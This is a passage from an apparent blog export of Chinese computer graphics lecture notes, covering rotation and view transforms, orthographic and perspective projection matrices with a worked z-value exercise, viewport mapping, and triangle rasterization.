<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081430398.png" alt="image-20230408143044373" style="zoom:67%;" /></p>
<p>下节课讲解细节</p>
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记4 三维空间的变换</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-4-san-wei-kong-jian-de-bian-huan/</url>
    <content><![CDATA[<h3 id="旋转的逆变换补充笔记">旋转的逆变换补充笔记</h3>
<p>补充上节课</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081529156.png" alt="" /><figcaption>image-20230408152934118</figcaption>
</figure>
<p>旋转变换R的转置矩阵等价于R的逆矩阵R^-1</p>
<p><strong>也就是说 旋转矩阵求逆只需要转置, 比较简单</strong></p>
<p>另外: 转置矩阵和逆矩阵相等的话, 称为<strong>正交矩阵</strong></p>
<h2 id="三维变换">三维变换</h2>
<p>当一次性应用一个复杂矩阵(而不是连续应用多个简单矩阵)时, <strong>先做左上角部分的变化, 再做平移变化</strong>, 也就是说, 仿射变化的加常数的操作是最后进行的</p>
<p>这点类似于高中几何题里面求解解析式时的先后顺序</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081544365.png" alt="image-20230408154448338" style="zoom:50%;" /></p>
<h3 id="旋转">旋转</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081544276.png" alt="image-20230408154400596" style="zoom:50%;" /></p>
<p>绕谁旋转, 说明他是不变量, 所以绕x旋转x变换因子为1, 其余的同理</p>
<p>至于为什么y轴的变换是反着的, 主要原因是xyz这三个方向如果无限写下去(类似于循环移位)是 xyzxyzxyzxyzxyzxyzxyz, 去掉头尾, 看中间:</p>
<p>x叉乘y = z(按照字母表顺序)</p>
<p>y叉乘z =x(按照字母表顺序)</p>
<p>但是</p>
<p>z叉乘x=y</p>
<p>也就是说, x叉乘z=-y</p>
<p>这个现象是y旋转与其他两个不相同的本质原因</p>
<p>弹幕里面说的很好:</p>
<p>第一种理解方式 <strong>因为Y轴是Z叉乘X，但计算的时候是先算(矩阵最左上角的)X坐标再算Z坐标，与叉乘顺序相反，所以Y旋转是逆的</strong></p>
<p>第二种理解方式 <strong>由于旋转默认是逆时针的, 其他的轴叉乘都是通过逆时针得到第三轴, 只有x和z是顺时针叉乘得到y 和 叉乘输入值的字母顺序相反</strong></p>
<h3 id="绕任意点旋转而非绕原点旋转">绕任意点旋转而非绕原点旋转</h3>
<p>首先平移到原点, 旋转后,再平移回去</p>
<p>(把本地坐标系转换成全局坐标系然后执行旋转)</p>
<h3 id="罗德里格斯旋转公式还需要额外补充">罗德里格斯旋转公式(还需要额外补充)</h3>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304081557869.png" alt="image-20230408155759807" style="zoom:67%;" /></p>
<p>证明思路</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304082147472.png" alt="" /><figcaption>image-20230408214749359</figcaption>
</figure>
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记4下 view变换</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-4-xia-view-bian-huan/</url>
    <content><![CDATA[<p>承接自上半笔记</p>
<h3 id="view-transformation">view transformation</h3>
<p><strong>viewing transformation</strong>包括以下内容</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304092156821.png" alt="image-20230409215625787" style="zoom:50%;" /></p>
<p>也就是相机的变换</p>
<p>考虑现实生活中的拍照片</p>
<p>首先需要让被拍摄对象摆好位置(进行model transformation) 然后让摄影师找个好位置(view transformation)然后拍照(投影 projection) 合起来简称 MVP变换</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304091953234.png" alt="image-20230409195313168" style="zoom:50%;" /></p>
<h3 id="相机定义">相机定义</h3>
<p>相机的定义如下</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304091955730.png" alt="" /><figcaption>image-20230409195532703</figcaption>
</figure>
<p>位置, 视方向, 向上方向(因为相机可以绕自身中轴线旋转)</p>
<h3 id="相对运动">相对运动</h3>
<p>当相机和其他东西一起以相同方式运动时, 得到的图片不会变化</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304092000326.png" alt="image-20230409200004274" style="zoom:67%;" /></p>
<p>也就是说, 坐标系是一个可以相对的概念, 因此为了讨论方便, 在讨论视点变换时, 我们认为:</p>
<p><strong>相机永远处于原点, 相机永远向-z轴看, 相机永远以y为向上方向</strong></p>
<p>原因是: 相机所在的地方我们视为一个平面, 由x和y轴确立</p>
<p>相机看向的位置视作纵深位置也就是z轴</p>
<p>但是为了满足右手坐标系, 纵深位置视作-z轴</p>
<p>这样就可以让z方向的矩阵的数值为正数, -z轴上的 1 单位长度向量相当于z轴上的 -1 单位长度向量</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304092004987.png" alt="image-20230409200405956" style="zoom:50%;" /></p>
<p>如何把相机设置为上述状态? 方法如下</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304092006514.png" alt="" /><figcaption>image-20230409200618485</figcaption>
</figure>
<p>首先位置变换到原点, 然后旋转g和t到-Z和Y</p>
<p>这样就对齐了具体操作请看下一小节</p>
<h3 id="相机归位操作">相机归位操作</h3>
<p>设最终归位所需矩阵为 <span class="math display">\[M = RT\]</span> 也就说先做平移变换 然后旋转</p>
<p>其中旋转矩阵 <span class="math display">\[ R = R_g \times R_t\]</span></p>
<p>首先是平移变换</p>
<p><span class="math display">\[
\left[
\begin{matrix}
1 &amp; 0 &amp; 0 &amp; -x_e\\
0 &amp; 1 &amp; 0 &amp; -y_e\\
0 &amp; 0 &amp; 1 &amp; -z_e\\
0 &amp; 0 &amp; 0 &amp; 1\\
\end{matrix}
\right]
\]</span></p>
<p>可以把相机放在原点</p>
<p>旋转矩阵并不好直接求, 因为我们前面学的公式都是从轴到目标地点的旋转, 但是我们现在需要的是任意位置旋转到轴</p>
<p>因此我们可以先求逆矩阵</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304092100421.png" alt="image-20230409210031389" style="zoom:50%;" /></p>
<p>在此之前插入小插曲</p>
<h4 id="正交矩阵与旋转矩阵">正交矩阵与旋转矩阵</h4>
<p>正交矩阵判定方法:</p>
<p>每一列向量的长度等于单位长度, 且各个列向量之间正交(互相垂直), 由此易得, <strong>旋转矩阵都是正交矩阵</strong></p>
<p>因为旋转之前的坐标系三个轴之间是正交的, 旋转之后也必然正交</p>
<p>另外正交矩阵有一个性质, <strong>正交矩阵的逆矩阵等于正交矩阵的转置矩阵</strong></p>
<p>因此, 求顺时针旋转, 或者是求旋转的逆旋转操作, 都只需要求得原始旋转的逆矩阵, 也就是转置矩阵</p>
<h4 id="另一种旋转公式">另一种旋转公式</h4>
<p>为了确定一个物体的当前旋转状态, 我们需要三个量, 这样还可以构建一个该物体的本地坐标系</p>
<p>因此我们可以得出另一种旋转公式</p>
<p>该公式起始位置为世界坐标, 结束位置为目标位置</p>
<p>在此期间, 该物体最初的本地坐标与世界坐标重合, 最终状态下, 本地坐标不再与世界坐标系重合</p>
<p><img src="C:/Users/valkie/AppData/Roaming/Typora/typora-user-images/image-20230409212953343.png" alt="image-20230409212953343" style="zoom:50%;" /></p>
<p>我们只需要写出目标位置的本地坐标系的三个轴</p>
<p>前面的笔记说过, 为了新建一个坐标系我们可以用叉乘</p>
<p>所以得出上图的坐标系</p>
<p>利用上面的公式可以不需要任何<strong>角度</strong>量的介入而完成旋转</p>
<p>回到最初的相机归位操作</p>
<p>我们只需要找到当前相机的本地坐标系, 就可以轻松找到让他旋转回到世界坐标系的旋转矩阵(求逆, 也就是求转置即可)</p>
<p><strong>这样旋转矩阵R和平移矩阵T都有了, 乘起来就可以得到单一的变换矩阵M 方便后续计算</strong></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304092140226.png" alt="image-20230409214029206" style="zoom:67%;" /></p>
<p>得到矩阵M 之后, 世界中所有物件都需要做变换M, 这样就可以进行相对运动, 类似于相对静止</p>
<p>也就是说优先保证相机移到世界坐标系, 然后让其他物件绑定到相机上面</p>
<p>对所有世界物体做出M变换后就可以开始准备下一阶段了</p>
<h2 id="投影变换">投影变换</h2>
<p>分为两种投影变换 正交投影(orthographic)和透视投影(perspective)</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304100822603.png" alt="" /><figcaption>image-20230410082203555</figcaption>
</figure>
<p>投影变换后还需要进行视口变换</p>
<p>在投影变换过程中, 物体不会等比例拉伸, 会变形, 这点很正常,视口变换会将其还原</p>
<h3 id="正交投影和透视投影分别是什么含义">正交投影和透视投影分别是什么含义</h3>
<p>正交投影意味着光线是平行光, 也就是说摄像头位于无限远处</p>
<p>透视投影就是日常情况, 近大远小, 平行线相交于消失点</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304111927370.png" alt="" /><figcaption>image-20230411192722289</figcaption>
</figure>
<p>由于正交投影摄像机处于无限远, 对于摄像机而言, 距离他x单位的物体和x+t单位的物体看起来就一样大了(前提是他们的体积确实是一样的), 这样就不存在近大远小了,平行线也就不会相较于消失点</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304111927799.png" alt="" /><figcaption>image-20230411192750747</figcaption>
</figure>
<h3 id="正交投影流程">正交投影流程</h3>
<p>首先完成了摄像机的相机归位操作</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304111931542.png" alt="" /><figcaption>image-20230411193135497</figcaption>
</figure>
<p>此时我们可以认为有一个幕布, 放在了原点处, 幕布大小是<span class="math inline">\([-1,1]^3\)</span></p>
<p>也就是说, 把相机这个对象, 抽象成了一块显影底片</p>
<p>这样的话z轴就消失了, 空间中只需要关心xy轴(也就是说有图层和遮罩了, 这也符合我们对相机拍照的认知</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304111934326.png" alt="" /><figcaption>image-20230411193435278</figcaption>
</figure>
<p>这里有一个小疑问点</p>
<p><strong>为什么摄像机看向-z方向, 但是z方向的物体还可以成像</strong></p>
<p>暂时按下不表, 先看正交投影的具体操作</p>
<p>首先把物体的"中心"平移到xy平面内,然后缩放</p>
<p>更具体的来说:</p>
<p>设长方体(这个长方体是视锥, 具体解释在下面的小结)为 $ [left,right] $, 将这个长方体缩放为 <span class="math inline">\([-1,1]^3\)</span> 的标准立方体(这里和投影不完全一样, 先这样做)</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304111937432.png" alt="" /><figcaption>image-20230411193750391</figcaption>
</figure>
<p>需要注意的是</p>
<p>由于是右手系, 看向-z方向, 所以l&lt;r, b&lt;t <strong>注意f&lt;n</strong>(正确)</p>
<p><strong>由于看向-z, 远点的z值会更小</strong></p>
<p><strong>但是如果是一根正坐标轴上, 离我们远的值应该是更大</strong></p>
<p>所以有的api采用了左手系来规避这个不符合直觉的地方</p>
<p>变换矩阵如下, 先做负的平移操作,然后缩放变成<span class="math inline">\([-1,1]^3\)</span> 总大小是2×2</p>
<p>注意, 这里的压缩不会导致数据丢失(除非超出浮点数表示范围), 因为实数是稠密的, 像素点才是离散的</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304112007952.png" alt="" /><figcaption>image-20230411200707911</figcaption>
</figure>
<h3 id="上一小节的长方形是什么">上一小节的长方形是什么</h3>
<p>这里课程主讲老师没太讲清楚,这个长方体不是空间中的物体本身,而是视锥</p>
<p>也就是说, 这个长方体规定了拍照的区域, 这个区域包括了从背景板到前景的范围, 如果我们把前景(本质上是前景到背景之间的 物体的映射像素)位移, 他对应的实际物体像素就会跟着位移,看下图, 长方体中间的每一根线对应着一个需要被成像的像素, 以及这个像素在前景上被映射的位置</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304112040758.png" alt="" /><figcaption>image-20230411204033734</figcaption>
</figure>
<h3 id="透视投影">透视投影</h3>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304112056188.png" alt="" /><figcaption>image-20230411205649146</figcaption>
</figure>
<p>透视投影的视锥是一个四棱台, 底面<strong>压缩</strong>为相同长方形后就可以按照正交投影来了</p>
<p>这里需要定义一下这个压缩过程:</p>
<ol type="1">
<li><span class="math inline">\(near\)</span> 面永远不变, 因为这个面意味着胶片位置(正交投影过程时还是会变的, 但是压缩过程不会变)</li>
<li><span class="math inline">\(far\)</span> 面的z值仍然保持不变, 也就是说整个四棱台的纵深不变</li>
<li>上述两个面的中心点 压缩后仍然为中心点</li>
</ol>
<p>根据上述要求 求解变换矩阵 <span class="math inline">\(M_{persp-&gt;ortho}\)</span> 该矩阵将透视投影转换为正交投影</p>
<p>我们先来看yz视图</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304112102184.png" alt="" /><figcaption>image-20230411210221139</figcaption>
</figure>
<p>可以看到一个相似三角形</p>
<p>所以挤压之后的y有 <span class="math display">\[
y&#39; = \frac{n}{z}y
\]</span></p>
<p>再求挤压之后的x, 同理根据相似三角形</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304112117480.png" alt="" /><figcaption>image-20230411211732446</figcaption>
</figure>
<p>所以有:</p>
<p><span class="math display">\[
\begin{equation}
\left\{
\begin{array}{lr}
x&#39; = \frac{n}{z}x &amp;  \\
y&#39; = \frac{n}{z}y &amp;  
\end{array}
\right.
\end{equation}
\]</span></p>
<p>根据上述内容可以得到 <span class="math inline">\(M_{persp-&gt;ortho}\)</span> 矩阵的部分元素(把除以z全部约掉, 让w值从1变为z)</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304122236366.png" alt="" /><figcaption>image-20230412223629294</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304122238818.png" alt="" /><figcaption>image-20230412223823784</figcaption>
</figure>
<p>如下所示 <span class="math display">\[
\left[
\begin{matrix}
n &amp; 0 &amp; 0 &amp; 0\\
0 &amp; n &amp; 0 &amp; 0\\
? &amp; ? &amp; ? &amp; ?\\
0 &amp; 0 &amp; 1 &amp; 0\\
\end{matrix}
\right]
\]</span></p>
<p>然后我们研究上面的问号都要填写哪些元素</p>
<p>首先观测 <span class="math inline">\(near\)</span> 平面, 发现其变换后, 平面内每个点的z值(也就是纵深距离) 都是不变的</p>
<p>同理 <span class="math inline">\(far\)</span> 平面的纵深值也是不变的, 写出下面两个方程组</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304132205727.png" alt="" /><figcaption>近平面</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304132207034.png" alt="" /><figcaption>原平面中心点0 0 f变换后仍然是0 0 f</figcaption>
</figure>
<p>这样就可以首先观察出,从左往右第一个和第二个问号是0</p>
<p>并且需要求解第三个问号和第四个问号, 分别设他们为A和B</p>
<p>得到如下方程</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304132208911.png" alt="" /><figcaption>image-20230413220849874</figcaption>
</figure>
<p>解得:</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304132209010.png" alt="" /><figcaption>image-20230413220907984</figcaption>
</figure>
<p>综上, 透视变换转为正交变换的矩阵<span class="math inline">\(M_{persp-&gt;ortho}\)</span>为</p>
<p>公式</p>
<p><span class="math display">\[
\left[
\begin{matrix}
n &amp; 0 &amp; 0 &amp; 0\\
0 &amp; n &amp; 0 &amp; 0\\
0 &amp; 0 &amp; n+f &amp; -nf\\
0 &amp; 0 &amp; 1 &amp; 0\\
\end{matrix}
\right]
\]</span></p>
<p>非常的简洁！</p>
<h3 id="其他的透视变换方法">其他的透视变换方法</h3>
<p>上述方法先转换成正交投影然后再做其他操作</p>
<p>其实也有一步到位的公式</p>
<p>首先定义视角(笔记5内容)和视图比率</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304141902223.png" alt="" /><figcaption>image-20230414190228185</figcaption>
</figure>
<p>可以写出一个一步到位的变换矩阵(直接从视锥变换到标准正方体) <span class="math display">\[
M_{\text {frustum }}=\left[\begin{array}{cccc}
\frac{\cot \frac{f o v}{2}}{\text { Aspect }} &amp; 0 &amp; 0 &amp; 0 \\
0 &amp; \cot \frac{f o v}{2} &amp; 0 &amp; 0 \\
0 &amp; 0 &amp; -\frac{f+n}{f-n} &amp; -\frac{2 n f}{f-n} \\
0 &amp; 0 &amp; -1 &amp; 0
\end{array}\right]
\]</span> 化简一下就是(形式一) <span class="math display">\[
M_{\text {frustum }}=
\left[
\begin{array}{cccc}
\frac{|n|}{r} &amp; 0 &amp; 0 &amp; 0 \\
0 &amp; \frac{|n|}{t} &amp; 0 &amp; 0 \\
0 &amp; 0 &amp; -\frac{f+n}{f-n} &amp; -\frac{2 n f}{f-n} \\
0 &amp; 0 &amp; -1 &amp; 0
\end{array}
\right]
\]</span></p>
<p>还有一种形式(形式二) <span class="math display">\[
\left[\begin{array}{cccc}
\frac{2 n}{r-l} &amp; 0 &amp; \frac{r+l}{r-l} &amp; 0 \\
0 &amp; \frac{2 n}{t-b} &amp; \frac{t+b}{t-b} &amp; 0 \\
0 &amp; 0 &amp; -\frac{f+n}{f-n} &amp; -\frac{2 n f}{f-n} \\
0 &amp; 0 &amp; -1 &amp; 0
\end{array}\right]
\]</span> 更常用的是形式一</p>
<p>证明过程https://zhuanlan.zhihu.com/p/181696883</p>
<p>注意的一点是, 形式二中, r和l t和b一般是相反数关系, 所以形式二的矩阵里有两个元素一般实际上为0</p>
<h3 id="课后习题">课后习题</h3>
<p>请问 <span class="math inline">\(near\)</span> 和 <span class="math inline">\(far\)</span> 平面之间的点的z值如何变化?</p>
<p>由于老师没有给出标准答案, 我这边也有点困惑</p>
<p>过程如下</p>
<p>设点A坐标 <span class="math inline">\(\left( 0,0,n+f/2,1 \right)\)</span> 设 <span class="math inline">\(n=5 , f=3\)</span> (因为f&lt;n)</p>
<p>则A点坐标矩阵为 <span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
4 \\
1 
\end{matrix}
\right]
\]</span></p>
<p>则变换矩阵为 <span class="math display">\[
\left[
\begin{matrix}
5 &amp; 0 &amp; 0 &amp; 0\\
0 &amp; 5 &amp; 0 &amp; 0\\
0 &amp; 0 &amp; 8 &amp; -15\\
0 &amp; 0 &amp; 1 &amp; 0\\
\end{matrix}
\right]
\]</span> 相乘得到 <span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
4.25 \\
1 
\end{matrix}
\right]
\]</span> <strong>可以发现变大了</strong></p>
<p>再取A点靠近n平面的点B <span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
3.5 \\
1 
\end{matrix}
\right]
\]</span> 相乘得到 <span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
3.71 \\
1 
\end{matrix}
\right]
\]</span> <strong>也是变大的</strong></p>
<p>再取点C靠近f平面 <span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
4.5 \\
1 
\end{matrix}
\right]
\]</span> 相乘得到 <span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
4.67 \\
1 
\end{matrix}
\right]
\]</span> <strong>还是变大的</strong></p>
<p><strong>但是</strong></p>
<p>如果n和f是<strong>负数</strong>分别是 <span class="math inline">\(n=-3 , f=-5\)</span> (f&lt;n)</p>
<p>得到变换矩阵为 <span class="math display">\[
\left[
\begin{matrix}
-3 &amp; 0 &amp; 0 &amp; 0\\
0 &amp; -3 &amp; 0 &amp; 0\\
0 &amp; 0 &amp; -8 &amp; -15\\
0 &amp; 0 &amp; 1 &amp; 0\\
\end{matrix}
\right]
\]</span> 点A为</p>
<p><span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
-4 \\
1 
\end{matrix}
\right]
\]</span> 得到 <span class="math display">\[
\left[
\begin{matrix}
0 \\ 
0 \\
-4.25 \\
1 
\end{matrix}
\right]
\]</span> 可以发现是变小的,其他几个点结论相同</p>
<p>总的来说是<strong>远离原点方向 推向f平面, 但是变大变小不确定</strong> 得看立方体在哪里, 总的来说绝对值变大</p>
<p><strong>数据集有限, 而且想不出来严格证明, 可能会有出错的地方</strong></p>
<p>图示如下</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304132256856.png" alt="" /><figcaption>image-20230413225631806</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304132258413.png" alt="" /><figcaption>image-20230413225843371</figcaption>
</figure>
<p>我这里把线段 <span class="math inline">\(I_nI_f\)</span> 想象成一根绳子, 绳子转动之后可以形成一个三角形, 由于三角形斜边大于直角边, 所以长度变长, 坐标的绝对值变大</p>
<p>图二中点 <span class="math inline">\(J\)</span> 变换到点 <span class="math inline">\(I\)</span> 的位置了</p>
<p>这个也可以间接说明实数的稠密性和不可数性, 因为总长度变短了, 但是每个点的z坐标绝对值反而变长了</p>
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记5 光栅化</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-5-guang-zha-hua/</url>
    <content><![CDATA[<h3 id="词源">词源</h3>
<p>光栅化一词起源于德语, 原型是屏幕加上动词后缀(笔者德语没有系统性学过 不知道这样说对不对) 也就是说 光栅化的原本意思是 <code>在屏幕上绘制</code> 这一动作</p>
<h3 id="视锥范围的感性划定">视锥范围的感性划定</h3>
<p>我们在上节课提到了视锥, 那么如何直观的划定视锥的范围</p>
<p>我们规定看向的第一个面是near , 然后求出来垂直视角 <span class="math inline">\(fovY\)</span> ,再定义一下视角比 <span class="math inline">\(aspect \ ratio\)</span> 根据这两个值就可以求出来水平视角<span class="math inline">\(fovX\)</span></p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304141832803.png" alt="" /><figcaption>image-20230414183252766</figcaption>
</figure>
<p>这里我们假设图片中间的灰色虚线经过坐标轴, 也就是说 <span class="math inline">\(l=-r,\)</span> <span class="math inline">\(b=-t\)</span></p>
<p>得到如下关系 <span class="math display">\[
\begin{aligned}
\tan \frac{f o v Y}{2} &amp; =\frac{t}{|n|} \\
\text { aspect } &amp; =\frac{r}{t}
\end{aligned}
\]</span> <img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304141902223.png" alt="image-20230414190228185" /></p>
<h3 id="定义什么是屏幕可绘制对象">定义什么是屏幕(可绘制对象)</h3>
<p>我们把屏幕定义成这样(一般的情况下, 屏幕坐标系的原点是屏幕最左上角的地方, 这里为了直观和方便, 定义为最左下角)</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142140284.png" alt="" /><figcaption>image-20230414214039247</figcaption>
</figure>
<p>第一个像素点的<strong>索引(index)</strong>被标记为二元组 <span class="math inline">\((0,0)\)</span> 其中心坐标为 <span class="math inline">\((0.5,0.5)\)</span> 需要加上0.5</p>
<p>索引数： <span class="math inline">\(from \ (0,0)\ to \ (x-1,y-1)\)</span></p>
<p>屏幕cover的范围： <span class="math inline">\(from \ (0,0)\ to \ (x,y)\)</span></p>
<h3 id="把上一小节的视锥映射到屏幕视口变换">把上一小节的视锥映射到屏幕(视口变换)</h3>
<p>首先<strong>暂时忽略</strong>z坐标, 该值表示深度, 后续会用于竞争待渲染元素对像素的所有权</p>
<p>只看x和y的话就很直观了, 只需要把正方体的视锥, 拉伸到屏幕的大小</p>
<p>拉伸函数为: <span class="math display">\[
M_{\text {viewport }}=\left(\begin{array}{cccc}
\frac{\text { width }}{2} &amp; 0 &amp; 0 &amp; \frac{\text { width }}{2} \\
0 &amp; \frac{\text { height }}{2} &amp; 0 &amp; \frac{\text { height }}{2} \\
0 &amp; 0 &amp; 1 &amp; 0 \\
0 &amp; 0 &amp; 0 &amp; 1
\end{array}\right)
\]</span></p>
<p>w列向量用于平移枢轴</p>
<p>另外两个主对角向量用于缩放scale</p>
<p>乘完上面的矩阵后就基本接近最终结果了, 接下来一步是把<strong>浮点数的描述图元, 映射到屏幕这个离散的承载体上面</strong> 转换成片元, 片元还携带着法线等信息, 需要进一步转换成像素点</p>
<h3 id="介绍了一些显示设备">介绍了一些显示设备</h3>
<p>略过</p>
<p>主要有绘图机和CRT和示波器等</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142211303.png" alt="image-20230414221132252" style="zoom: 67%;" /></p>
<h3 id="为什么选用三角形作为基本平面">为什么选用三角形作为基本平面</h3>
<ol type="1">
<li>三角形是最少点可以组成平面的图形</li>
<li>三角形一定是平的, 三个点确定一个平面, 四个点不一定</li>
<li>其他图形都可以拆成三角形</li>
<li>三角形的内外定义很清晰, 不用考虑有洞的情况, 或者凹多边形什么的</li>
<li>渐变效果好做, 定义距离三个点的距离比多个点简单</li>
</ol>
<h3 id="光栅化过程">光栅化过程</h3>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142217781.png" alt="" /><figcaption>image-20230414221747734</figcaption>
</figure>
<p>经过前面的MVP和视口变换, 现在已经拿到了在二维平面(平面大小等于屏幕)上的点的坐标(是浮点数的连续坐标, 不是离散的) 我们现在需要映射到一个个单位中(片元) 接下来才能把片元映射成像素点</p>
<p>接下来需要判断各个像素中心点与三角形的内外关系, <strong>这里需要用到之前的判定方法, 同号在内, 异号在外</strong></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142244503.png" alt="image-20230414224437462" style="zoom:50%;" /></p>
<p>不考虑抗锯齿的话, 如果覆盖了中心点, 就可以认为覆盖面积超过一半, 应当显示在屏幕上对应像素位置, 如果没超过一半, 则完全不显示(现实中会用抖动算法部分的进行显示)</p>
<p>然后进行采样(采样 sample 定义: 把连续的数据离散化的操作)</p>
<p>定义函数如下</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142224341.png" alt="" /><figcaption>image-20230414222442313</figcaption>
</figure>
<p>输入是一个连续的浮点三角形t和待采样的位置(屏幕像素) 执行过程:</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142227005.png" alt="" /><figcaption>image-20230414222753982</figcaption>
</figure>
<p>输出是一个离散的布尔信号, 结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142226580.png" alt="" /><figcaption>image-20230414222633547</figcaption>
</figure>
<p>我们可以优化一下, <strong>上述算法需要测试屏幕上所有像素, 我们只需要测试外接的盒体内的像素就行了</strong></p>
<h3 id="其他光栅化优化算法">其他光栅化优化算法</h3>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142245705.png" alt="" /><figcaption>image-20230414224551666</figcaption>
</figure>
<p>由于屏幕等显示设备一般是一行行的</p>
<p>所以我们也别费尽心思找碰撞盒了， 直接找每行最左边的像素， for循环往右边循环，等找到了某个像素判断在外面的时候， break到下一行的for循环</p>
<p>但是这种优化方法作用有限，有效性较大的场景是一个旋转的狭长钝角三角形， 他的碰撞盒包括的内容很多 但是自身的实际体积（面积）很小</p>
<h3 id="介绍了一些其他显示像素排布">介绍了一些其他显示像素排布</h3>
<p>也就是常说的钻石排布和周冬雨排布， 此时的像素不是一行行的， 而是斜对角的， 或者是更加花里胡哨的形式</p>
<p>附上一段弹幕</p>
<p>光线叠加会更加强烈明亮，但是色彩叠加会变暗，所以有聪明的画家发明了点彩法，用很小的紧密的点间隔画上黄色和蓝色，实现高亮饱满的绿色</p>
<p>也就是说， 颜料是减色的，屏幕显示是增色的</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142249175.png" alt="" /><figcaption>image-20230414224932083</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304142249248.png" alt="" /><figcaption>image-20230414224955186</figcaption>
</figure>
<h3 id="抗锯齿">抗锯齿</h3>
<p>简答讲述了一下抗锯齿，锯齿英文 jaggies</p>
<p>信号采样率不够高导致的走样</p>
<p>解决方法和细节请看下节课</p>
]]></content>
      <categories>
        <category>图形学笔记</category>
      </categories>
      <tags>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>图形学笔记6 反走样</title>
    <url>/tu-xing-xue-bi-ji/tu-xing-xue-bi-ji-6-fan-zou-yang-yu-shen-du-huan-chong/</url>
    <content><![CDATA[<p>反走样就是抗锯齿一类的技术</p>
<h3 id="上节课的问题">上节课的问题</h3>
<p>将连续信号离散化的过程跟不上连续信号的变化过程(实数是稠密的)</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162156256.png" alt="" /><figcaption>image-20230416215610223</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304162155408.png" alt="" /><figcaption>image-20230416215550302</figcaption>
</figure>
<h2 id="什么是采样">什么是采样</h2>
